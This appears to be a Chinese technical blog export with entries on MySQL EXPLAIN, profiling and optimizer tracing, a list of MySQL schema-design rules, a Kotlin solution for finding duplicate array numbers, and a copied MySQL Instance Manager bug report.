<h2 id="key-len"><a href="#key-len" class="headerlink" title="key_len"></a>key_len</h2><p>表示索引中使用的字节数，可通过该列计算查询中使用的索引的长度（key_len显示的值为索引字段的最大可能长度，并非实际使用长度，即key_len是根据表定义计算而得，不是通过表内检索出的）<br>不损失精确性的情况下，长度越短越好 </p>
<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p>ref列显示将哪些列或常量与key列中指定的索引进行比较，以便从表中选择行。<br>如果值是func，则使用的值是某个函数的结果。要查看哪个函数，请在EXPLAIN之后使用SHOW warning查看扩展的EXPLAIN输出。这个函数实际上可能是一个运算符，比如算术运算符。</p>
<h2 id="rows"><a href="#rows" class="headerlink" title="rows"></a>rows</h2><p> 表示MySQL根据表统计信息及索引选用情况，估算的找到所需的记录所需要读取的行数</p>
<h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><p>该列包含MySQL解决查询的详细信息,有以下几种情况：</p>
<ol>
<li><p>Using where:列数据是从仅仅使用了索引中的信息而没有读取实际的行动的表返回的，这发生在对表的全部的请求列都是同一个索引的部分的时候，表示mysql服务器将在存储引擎检索行后再进行过滤</p>
</li>
<li><p>Using temporary：表示MySQL需要使用临时表来存储结果集，常见于排序和分组查询</p>
</li>
<li><p>Using filesort：MySQL中无法利用索引完成的排序操作称为“文件排序”</p>
</li>
<li><p>Using join buffer：改值强调了在获取连接条件时没有使用索引，并且需要连接缓冲区来存储中间结果。如果出现了这个值，那应该注意，根据查询的具体情况可能需要添加索引来改进能。</p>
</li>
<li><p>Impossible where：这个值强调了where语句会导致没有符合条件的行。</p>
</li>
<li><p>Select tables optimized away：这个值意味着仅通过使用索引，优化器可能仅从聚合函数结果中返回一行</p>
</li>
</ol>
<p>有时候使用explain不能定位到问题，可配合profile来联合分析。</p>
<h1 id="show-profile"><a href="#show-profile" class="headerlink" title="show profile"></a>show profile</h1><p>SHOW PROFILE和SHOW PROFILES语句显示分析信息，指示在当前会话过程中执行的语句的资源使用情况。<br>基本语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW PROFILE [type [, type] ... ]</span><br><span class="line">    [FOR QUERY n]</span><br><span class="line">    [LIMIT row_count [OFFSET offset]]</span><br><span class="line"></span><br><span class="line">type: &#123;</span><br><span class="line">    ALL</span><br><span class="line">  | BLOCK IO</span><br><span class="line">  | CONTEXT SWITCHES</span><br><span class="line">  | CPU</span><br><span class="line">  | IPC</span><br><span class="line">  | MEMORY</span><br><span class="line">  | PAGE FAULTS</span><br><span class="line">  | SOURCE</span><br><span class="line">  | SWAPS</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当然，首先要开启profile.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT @@profiling;</span><br><span class="line">+-------------+</span><br><span class="line">| @@profiling |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SET profiling = 1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>查看所有的profiles。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW profiles;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Query_ID	Duration	Query</span><br><span class="line">30	0.00010284	SET profiling_history_size = 15</span><br><span class="line">31	0.00350268	SHOW STATUS</span><br><span class="line">32	0.00011305	select @@profiling</span><br><span class="line">33	0.00262382	SHOW STATUS</span><br><span class="line">34	0.00048830	select state, round(sum(duration),5) as `duration (summed) in sec` from information_schema.profiling where query_id = 32 group by state order by `duration (summed) in sec` desc</span><br></pre></td></tr></table></figure>
<p>查看指定id的profile,查看具体线程的时间消耗。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW profile FOR QUERY 34;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/12/21/数据库/mysql/MySQL sql优化的一般步骤/profile.png" alt></p>
<p>其中sending data状态是需要大量磁盘io操作的，比较耗费时间。其他的信息参考mysql官网的说明。</p>
<h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>MySQL从5.6加入了SQL的跟踪trace。通过trace文件可以看到优化器为何选择这个执行计划而不是其他的。<br>首先要开启跟踪trace，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 开启并且设置数据格式为JSON</span><br><span class="line">SET OPTIMIZER_TRACE=&quot;enabled=on&quot;,END_MARKERS_IN_JSON=ON; </span><br><span class="line">-- 设置内存</span><br><span class="line">SET OPTIMIZER_TRACE_MAX_MEM_SIZE=1000000;</span><br></pre></td></tr></table></figure></p>
<p>查看是否开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &apos;%optimizer_trace%&apos;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Variable_name	Value</span><br><span class="line">optimizer_trace	enabled=on,one_line=off</span><br><span class="line">optimizer_trace_features	greedy_search=on,range_optimizer=on,dynamic_range=on,repeated_subselect=on</span><br><span class="line">optimizer_trace_limit	1</span><br><span class="line">optimizer_trace_max_mem_size	1000000</span><br><span class="line">optimizer_trace_offset	-1</span><br></pre></td></tr></table></figure>
<p>开始执行SQL<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from version;</span><br><span class="line">+--------+----------------+----------------------------+</span><br><span class="line">| VER_ID | SCHEMA_VERSION | VERSION_COMMENT            |</span><br><span class="line">+--------+----------------+----------------------------+</span><br><span class="line">|      1 | 2.3.0          | Hive release version 2.3.0 |</span><br><span class="line">+--------+----------------+----------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>查看跟踪信息,<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from information_schema.optimizer_trace\G</span><br></pre></td></tr></table></figure></p>
<p>查看TRACE字段中对应的json信息。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"steps"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"join_preparation"</span>: &#123;</span><br><span class="line">        <span class="attr">"select#"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"steps"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"expanded_query"</span>: <span class="string">"/* select#1 */ select `version`.`VER_ID` AS `VER_ID`,`version`.`SCHEMA_VERSION` AS `SCHEMA_VERSION`,`version`.`VERSION_COMMENT` AS `VERSION_COMMENT` from `version`"</span></span><br><span class="line">          &#125;</span><br><span class="line">        ] /* steps */</span><br><span class="line">      &#125; /* join_preparation */</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"join_optimization"</span>: &#123;</span><br><span class="line">        <span class="attr">"select#"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"steps"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"table_dependencies"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"table"</span>: <span class="string">"`version`"</span>,</span><br><span class="line">                <span class="attr">"row_may_be_null"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"map_bit"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"depends_on_map_bits"</span>: [</span><br><span class="line">                ] /* depends_on_map_bits */</span><br><span class="line">              &#125;</span><br><span class="line">            ] /* table_dependencies */</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"rows_estimation"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"table"</span>: <span class="string">"`version`"</span>,</span><br><span class="line">                <span class="attr">"table_scan"</span>: &#123;</span><br><span class="line">                  <span class="attr">"rows"</span>: <span class="number">1</span>,</span><br><span class="line">                  <span class="attr">"cost"</span>: <span class="number">1</span></span><br><span class="line">                &#125; /* table_scan */</span><br><span class="line">              &#125;</span><br><span class="line">            ] /* rows_estimation */</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"considered_execution_plans"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"plan_prefix"</span>: [</span><br><span class="line">                ] /* plan_prefix */,</span><br><span class="line">                <span class="attr">"table"</span>: <span class="string">"`version`"</span>,</span><br><span class="line">                <span class="attr">"best_access_path"</span>: &#123;</span><br><span class="line">                  <span class="attr">"considered_access_paths"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="attr">"rows_to_scan"</span>: <span class="number">1</span>,</span><br><span class="line">                      <span class="attr">"access_type"</span>: <span class="string">"scan"</span>,</span><br><span class="line">                      <span class="attr">"resulting_rows"</span>: <span class="number">1</span>,</span><br><span class="line">                      <span class="attr">"cost"</span>: <span class="number">1.2</span>,</span><br><span class="line">                      <span class="attr">"chosen"</span>: <span class="literal">true</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  ] /* considered_access_paths */</span><br><span class="line">                &#125; /* best_access_path */,</span><br><span class="line">                <span class="attr">"condition_filtering_pct"</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">"rows_for_plan"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"cost_for_plan"</span>: <span class="number">1.2</span>,</span><br><span class="line">                <span class="attr">"chosen"</span>: <span class="literal">true</span></span><br><span class="line">              &#125;</span><br><span class="line">            ] /* considered_execution_plans */</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"attaching_conditions_to_tables"</span>: &#123;</span><br><span class="line">              <span class="attr">"original_condition"</span>: <span class="literal">null</span>,</span><br><span class="line">              <span class="attr">"attached_conditions_computation"</span>: [</span><br><span class="line">              ] /* attached_conditions_computation */,</span><br><span class="line">              <span class="attr">"attached_conditions_summary"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="attr">"table"</span>: <span class="string">"`version`"</span>,</span><br><span class="line">                  <span class="attr">"attached"</span>: <span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">              ] /* attached_conditions_summary */</span><br><span class="line">            &#125; /* attaching_conditions_to_tables */</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"refine_plan"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"table"</span>: <span class="string">"`version`"</span></span><br><span class="line">              &#125;</span><br><span class="line">            ] /* refine_plan */</span><br><span class="line">          &#125;</span><br><span class="line">        ] /* steps */</span><br><span class="line">      &#125; /* join_optimization */</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"join_execution"</span>: &#123;</span><br><span class="line">        <span class="attr">"select#"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"steps"</span>: [</span><br><span class="line">        ] /* steps */</span><br><span class="line">      &#125; /* join_execution */</span><br><span class="line">    &#125;</span><br><span class="line">  ] /* steps */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当然这只是一个简单的查询的跟踪信息,其他更复杂的SQL的跟踪信息会更加详尽，不过大概的结构就是这个样子的。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过上述步骤，一般可以定位到问题,剩下的就是对症下药。索引优化、批量数据优化、表碎片、具体的SQL操作的优化等等具体情况具体分析。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html" target="_blank" rel="noopener">slow-query-log</a></p>
</li>
<li><p><a href="https://dev.mysql.com/doc/refman/5.7/en/mysqldumpslow.html" target="_blank" rel="noopener">mysqldumpslow</a></p>
</li>
<li><p><a href="https://dev.mysql.com/doc/refman/5.7/en/explain-output.html" target="_blank" rel="noopener">explain-output</a></p>
</li>
<li><p><a href="https://dev.mysql.com/doc/internals/en/optimizer-tracing.html" target="_blank" rel="noopener">optimizer-tracing</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql数据库设计规范</title>
    <url>/2018/10/16/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p>军规适用场景：并发量大、数据量大的互联网业务</p>
<p>军规：介绍内容</p>
<p>解读：讲解原因，解读比军规更重要</p>
<h1 id="一、基础规范"><a href="#一、基础规范" class="headerlink" title="一、基础规范"></a>一、基础规范</h1><h2 id="1-必须使用InnoDB存储引擎"><a href="#1-必须使用InnoDB存储引擎" class="headerlink" title="1.  必须使用InnoDB存储引擎"></a>1.  必须使用InnoDB存储引擎</h2><p>解读：支持事务、行级锁、并发性能更好、CPU及内存缓存页优化使得资源利用率更高</p>
<h2 id="2-必须使用UTF8字符集"><a href="#2-必须使用UTF8字符集" class="headerlink" title="2. 必须使用UTF8字符集"></a>2. 必须使用UTF8字符集</h2><p>解读：万国码，无需转码，无乱码风险，节省空间（由于移动设备原因最好使用utf8mb4)</p>
<h2 id="3-数据表、数据字段必须加入中文注释"><a href="#3-数据表、数据字段必须加入中文注释" class="headerlink" title="3. 数据表、数据字段必须加入中文注释"></a>3. 数据表、数据字段必须加入中文注释</h2><p>解读：N年后谁tm知道这个r1,r2,r3字段是干嘛的</p>
<h2 id="4-禁止使用存储过程、视图、触发器、Event"><a href="#4-禁止使用存储过程、视图、触发器、Event" class="headerlink" title="4. 禁止使用存储过程、视图、触发器、Event"></a>4. 禁止使用存储过程、视图、触发器、Event</h2><p>解读：高并发大数据的互联网业务，架构设计思路是“解放数据库CPU，将计算转移到服务层”，并发量大的情况下，这些功能很可能将数据库拖死，业务逻辑放到服务层具备更好的扩展性，能够轻易实现“增机器就加性能”。数据库擅长存储与索引，CPU计算还是上移吧</p>
<h2 id="5-禁止存储大文件或者大照片"><a href="#5-禁止存储大文件或者大照片" class="headerlink" title="5. 禁止存储大文件或者大照片"></a>5. 禁止存储大文件或者大照片</h2><p>解读：为何要让数据库做它不擅长的事情？大文件和照片存储在文件系统，数据库里存URI多好</p>
<h1 id="二、命名规范"><a href="#二、命名规范" class="headerlink" title="二、命名规范"></a>二、命名规范</h1><h2 id="6-只允许使用内网域名，而不是ip连接数据库"><a href="#6-只允许使用内网域名，而不是ip连接数据库" class="headerlink" title="6. 只允许使用内网域名，而不是ip连接数据库"></a>6. 只允许使用内网域名，而不是ip连接数据库</h2><h2 id="7-线上环境、开发环境、测试环境数据库内网域名遵循命名规范-虽然IP访问更快，域名访问需要内网dns-但是对于大数据库的扩展和迁库考虑，域名更好）"><a href="#7-线上环境、开发环境、测试环境数据库内网域名遵循命名规范-虽然IP访问更快，域名访问需要内网dns-但是对于大数据库的扩展和迁库考虑，域名更好）" class="headerlink" title="7. 线上环境、开发环境、测试环境数据库内网域名遵循命名规范(虽然IP访问更快，域名访问需要内网dns,但是对于大数据库的扩展和迁库考虑，域名更好）"></a>7. 线上环境、开发环境、测试环境数据库内网域名遵循命名规范(虽然IP访问更快，域名访问需要内网dns,但是对于大数据库的扩展和迁库考虑，域名更好）</h2><p>业务名称：xxx</p>
<p>线上环境：dj.xxx.db</p>
<p>开发环境：dj.xxx.rdb</p>
<p>测试环境：dj.xxx.tdb</p>
<p>从库在名称后加-s标识，备库在名称后加-ss标识</p>
<p>线上从库：dj.xxx-s.db</p>
<p>线上备库：dj.xxx-sss.db</p>
<h2 id="8-库名、表名、字段名：小写，下划线风格，不超过32个字符，必须见名知意，禁止拼音英文混用"><a href="#8-库名、表名、字段名：小写，下划线风格，不超过32个字符，必须见名知意，禁止拼音英文混用" class="headerlink" title="8. 库名、表名、字段名：小写，下划线风格，不超过32个字符，必须见名知意，禁止拼音英文混用"></a>8. 库名、表名、字段名：小写，下划线风格，不超过32个字符，必须见名知意，禁止拼音英文混用</h2><h2 id="9-表名t-xxx，非唯一索引名idx-xxx，唯一索引名uniq-xxx"><a href="#9-表名t-xxx，非唯一索引名idx-xxx，唯一索引名uniq-xxx" class="headerlink" title="9. 表名t_xxx，非唯一索引名idx_xxx，唯一索引名uniq_xxx"></a>9. 表名t_xxx，非唯一索引名idx_xxx，唯一索引名uniq_xxx</h2><h1 id="三、表设计规范"><a href="#三、表设计规范" class="headerlink" title="三、表设计规范"></a>三、表设计规范</h1><h2 id="10-单实例表数目必须小于500"><a href="#10-单实例表数目必须小于500" class="headerlink" title="10. 单实例表数目必须小于500"></a>10. 单实例表数目必须小于500</h2><h2 id="11-单表列数目必须小于30"><a href="#11-单表列数目必须小于30" class="headerlink" title="11. 单表列数目必须小于30"></a>11. 单表列数目必须小于30</h2><h2 id="12-表必须有主键，例如自增主键"><a href="#12-表必须有主键，例如自增主键" class="headerlink" title="12. 表必须有主键，例如自增主键"></a>12. 表必须有主键，例如自增主键</h2><p>解读：</p>
<p>a）主键递增，数据行写入可以提高插入性能，可以避免page分裂，减少表碎片提升空间和内存的使用</p>
<p>b）主键要选择较短的数据类型， Innodb引擎普通索引都会保存主键的值，较短的数据类型可以有效的减少索引的磁盘空间，提高索引的缓存效率</p>
<p>c） 无主键的表删除，在row模式的主从架构，会导致备库夯住</p>
<h2 id="13-禁止使用外键，如果有外键完整性约束，需要应用程序控制"><a href="#13-禁止使用外键，如果有外键完整性约束，需要应用程序控制" class="headerlink" title="13. 禁止使用外键，如果有外键完整性约束，需要应用程序控制"></a>13. 禁止使用外键，如果有外键完整性约束，需要应用程序控制</h2><p>解读：外键会导致表与表之间耦合，update与delete操作都会涉及相关联的表，十分影响sql 的性能，甚至会造成死锁。高并发情况下容易造成数据库性能，大数据高并发业务场景数据库使用以性能优先</p>
<h1 id="四、字段设计规范"><a href="#四、字段设计规范" class="headerlink" title="四、字段设计规范"></a>四、字段设计规范</h1><h2 id="14-必须把字段定义为NOT-NULL并且提供默认值"><a href="#14-必须把字段定义为NOT-NULL并且提供默认值" class="headerlink" title="14. 必须把字段定义为NOT NULL并且提供默认值"></a>14. 必须把字段定义为NOT NULL并且提供默认值</h2><p>解读：</p>
<p>a）null的列使索引/索引统计/值比较都更加复杂，对MySQL来说更难优化</p>
<p>b）null 这种类型MySQL内部需要进行特殊处理，增加数据库处理记录的复杂性；同等条件下，表中有较多空字段的时候，数据库的处理性能会降低很多</p>
<p>c）null值需要更多的存储空，无论是表还是索引中每行中的null的列都需要额外的空间来标识</p>
<p>d）对null 的处理时候，只能采用is null或is not null，而不能采用=、in、&lt;、&lt;&gt;、!=、not in这些操作符号。如：where name!=’shenjian’，如果存在name为null值的记录，查询结果就不会包含name为null值的记录</p>
<h2 id="15-禁止使用TEXT、BLOB类型"><a href="#15-禁止使用TEXT、BLOB类型" class="headerlink" title="15. 禁止使用TEXT、BLOB类型"></a>15. 禁止使用TEXT、BLOB类型</h2><p>解读：会浪费更多的磁盘和内存空间，非必要的大量的大字段查询会淘汰掉热数据，导致内存命中率急剧降低，影响数据库性能</p>
<h2 id="16-禁止使用小数存储货币（可以把单位算作分，显示和计算时x100-…）"><a href="#16-禁止使用小数存储货币（可以把单位算作分，显示和计算时x100-…）" class="headerlink" title="16. 禁止使用小数存储货币（可以把单位算作分，显示和计算时x100,…）"></a>16. 禁止使用小数存储货币（可以把单位算作分，显示和计算时x100,…）</h2><p>解读：使用整数吧，小数容易导致钱对不上</p>
<h2 id="17-必须使用varchar-20-存储手机号"><a href="#17-必须使用varchar-20-存储手机号" class="headerlink" title="17. 必须使用varchar(20)存储手机号"></a>17. 必须使用varchar(20)存储手机号</h2><p>解读：</p>
<p>a）涉及到区号或者国家代号，可能出现+-()</p>
<p>b）手机号会去做数学运算么？</p>
<p>c）varchar可以支持模糊查询，例如：like“138%”</p>
<h2 id="18-禁止使用ENUM，可使用TINYINT代替"><a href="#18-禁止使用ENUM，可使用TINYINT代替" class="headerlink" title="18. 禁止使用ENUM，可使用TINYINT代替"></a>18. 禁止使用ENUM，可使用TINYINT代替</h2><p>解读：</p>
<p>a）增加新的ENUM值要做DDL操作</p>
<p>b）ENUM的内部实际存储就是整数，你以为自己定义的是字符串？</p>
<h1 id="五、索引设计规范"><a href="#五、索引设计规范" class="headerlink" title="五、索引设计规范"></a>五、索引设计规范</h1><h2 id="19-单表索引建议控制在5个以内"><a href="#19-单表索引建议控制在5个以内" class="headerlink" title="19. 单表索引建议控制在5个以内"></a>19. 单表索引建议控制在5个以内</h2><h2 id="20-单索引字段数不允许超过5个"><a href="#20-单索引字段数不允许超过5个" class="headerlink" title="20. 单索引字段数不允许超过5个"></a>20. 单索引字段数不允许超过5个</h2><p>解读：字段超过5个时，实际已经起不到有效过滤数据的作用了</p>
<h2 id="21-禁止在更新十分频繁、区分度不高的属性上建立索引"><a href="#21-禁止在更新十分频繁、区分度不高的属性上建立索引" class="headerlink" title="21. 禁止在更新十分频繁、区分度不高的属性上建立索引"></a>21. 禁止在更新十分频繁、区分度不高的属性上建立索引</h2><p>解读：</p>
<p>a）更新会变更B+树，更新频繁的字段建立索引会大大降低数据库性能</p>
<p>b）“性别”这种区分度不大的属性，建立索引是没有什么意义的，不能有效过滤数据，性能与全表扫描类似</p>
<h2 id="22-建立组合索引，必须把区分度高的字段放在前面"><a href="#22-建立组合索引，必须把区分度高的字段放在前面" class="headerlink" title="22. 建立组合索引，必须把区分度高的字段放在前面"></a>22. 建立组合索引，必须把区分度高的字段放在前面</h2><p>解读：能够更加有效的过滤数据</p>
<h1 id="六、SQL使用规范"><a href="#六、SQL使用规范" class="headerlink" title="六、SQL使用规范"></a>六、SQL使用规范</h1><h2 id="23-禁止使用SELECT-，只获取必要的字段，需要显示说明列属性"><a href="#23-禁止使用SELECT-，只获取必要的字段，需要显示说明列属性" class="headerlink" title="23. 禁止使用SELECT *，只获取必要的字段，需要显示说明列属性"></a>23. 禁止使用SELECT *，只获取必要的字段，需要显示说明列属性</h2><p>解读：</p>
<p>a）读取不需要的列会增加CPU、IO、NET消耗</p>
<p>b）不能有效的利用覆盖索引</p>
<p>c）使用SELECT *容易在增加或者删除字段后出现程序BUG</p>
<h2 id="24-禁止使用INSERT-INTO-t-xxx-VALUES-xxx-，必须显示指定插入的列属性"><a href="#24-禁止使用INSERT-INTO-t-xxx-VALUES-xxx-，必须显示指定插入的列属性" class="headerlink" title="24. 禁止使用INSERT INTO t_xxx VALUES(xxx)，必须显示指定插入的列属性"></a>24. 禁止使用INSERT INTO t_xxx VALUES(xxx)，必须显示指定插入的列属性</h2><p>解读：容易在增加或者删除字段后出现程序BUG</p>
<h2 id="25-禁止使用属性隐式转换"><a href="#25-禁止使用属性隐式转换" class="headerlink" title="25. 禁止使用属性隐式转换"></a>25. 禁止使用属性隐式转换</h2><p>解读：SELECT uid FROM t_user WHERE phone=13812345678 会导致全表扫描，而不能命中phone索引，猜猜为什么？（这个线上问题不止出现过一次）</p>
<p>int数据类型优先级高于archer， 该查询会把phone转换为int，因此需要把表中所有数据改成int，所以必须全盘扫描</p>
<h2 id="26-禁止在WHERE条件的属性上使用函数或者表达式"><a href="#26-禁止在WHERE条件的属性上使用函数或者表达式" class="headerlink" title="26. 禁止在WHERE条件的属性上使用函数或者表达式"></a>26. 禁止在WHERE条件的属性上使用函数或者表达式</h2><p>解读：SELECT uid FROM t_user WHERE from_unixtime(day)&gt;=’2017-02-15’ 会导致全表扫描</p>
<p>正确的写法是：SELECT uid FROM t_user WHERE day&gt;= unix_timestamp(‘2017-02-15 00:00:00’)</p>
<h2 id="27-禁止负向查询，以及-开头的模糊查询"><a href="#27-禁止负向查询，以及-开头的模糊查询" class="headerlink" title="27. 禁止负向查询，以及%开头的模糊查询"></a>27. 禁止负向查询，以及%开头的模糊查询</h2><p>解读：</p>
<p>a）负向查询条件：NOT、!=、&lt;&gt;、!&lt;、!&gt;、NOT IN、NOT LIKE等，会导致全表扫描</p>
<p>b）%开头的模糊查询，会导致全表扫描</p>
<h2 id="28-禁止大表使用JOIN查询，禁止大表使用子查询"><a href="#28-禁止大表使用JOIN查询，禁止大表使用子查询" class="headerlink" title="28. 禁止大表使用JOIN查询，禁止大表使用子查询"></a>28. 禁止大表使用JOIN查询，禁止大表使用子查询</h2><p>解读：会产生临时表，消耗较多内存与CPU，极大影响数据库性能</p>
<h2 id="29-禁止使用OR条件，必须改为IN查询"><a href="#29-禁止使用OR条件，必须改为IN查询" class="headerlink" title="29. 禁止使用OR条件，必须改为IN查询"></a>29. 禁止使用OR条件，必须改为IN查询</h2><p>解读：旧版本Mysql的OR查询是不能命中索引的，即使能命中索引，为何要让数据库耗费更多的CPU帮助实施查询优化呢？</p>
<h2 id="30-应用程序必须捕获SQL异常，并有相应处理"><a href="#30-应用程序必须捕获SQL异常，并有相应处理" class="headerlink" title="30. 应用程序必须捕获SQL异常，并有相应处理"></a>30. 应用程序必须捕获SQL异常，并有相应处理</h2><p>总结：大数据量高并发的互联网业务，极大影响数据库性能的都不让用，不让用哟。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://blog.csdn.net/permike/article/details/55504382?ref=myread" target="_blank" rel="noopener">MySQL数据库30条规范解读(转载)</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指 Offer 03. 数组中重复的数字</title>
    <url>/2019/04/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/offer/repeatNumberInArray/</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">找出数组中重复的数字。</span><br><span class="line"></span><br><span class="line">在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。</span><br></pre></td></tr></table></figure>
<h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[2, 3, 1, 0, 2, 5, 3]</span><br><span class="line">输出：2 或 3</span><br></pre></td></tr></table></figure>
<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2 &lt;= n &lt;= 100000</span><br></pre></td></tr></table></figure>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>使用HashMap实现，时间复杂度为O(n),空间复杂度为O(n)。<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">findRepeatNumber</span><span class="params">(nums: <span class="type">IntArray</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">        <span class="keyword">val</span> map = HashMap&lt;<span class="built_in">Int</span>,<span class="built_in">Int</span>&gt;()</span><br><span class="line">        <span class="keyword">var</span> a : <span class="built_in">Int</span>  = nums.<span class="keyword">get</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> (num <span class="keyword">in</span> nums)&#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(num))&#123;</span><br><span class="line">                a = num</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(num,num)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>offer,array,hashmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Too many arguments (first extra is &#39;start&#39;)</title>
    <url>/2018/02/27/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/Too%20many%20arguments%20(first%20extra%20is%20&#39;start&#39;)/</url>
    <content><![CDATA[<p>[31 Oct 2006 16:38] Craig Sylvester</p>
<p>Description:<br>Instance Manager fails to start database server with the following error being reported:</p>
<p>061031 11:02:10 guardian: starting instance mysqld2<br>/usr/local/mysql5.0.26/bin/mysqld: Too many arguments (first extra is ‘’).<br>Use —help to get a list of available options</p>
<p>Entry in /etc/my.cnf file reads:</p>
<p>[mysqld50026]<br>mysqld-path = /usr/local/mysql5.0.26/bin/mysqld<br>server-id = 1<br>port  = 3306<br>pid-file = /tmp/mysql50026.pid<br>socket  = /tmp/mysql50026.sock<br>datadir  = /usr/local/mysql5.0.26/data</p>
<p>NOTE: This appears to be related to bug #21275 and if fact may be the same issue if the XXX contains periods.</p>
<p>How to repeat:<br>Install server in directory (or create link) with periods in the path (i.e., /usr/local/mysql5.0.26) and change my.cnf entries accordingly.</p>
<p>Modify the mysql.server script to start the Instance Manager instead of using mysqld_safe:</p>
<pre><code>use_mysqld_safe = 0
</code></pre><p>Attempt to start server with instance manager:</p>
<p>“$MYSQL_HOME/bin/mysqlmanager —user=mysql —pid-file=/tmp/mysqlmanager.pid”</p>
<p>or “/etc/init.d/mysql.server start”</p>
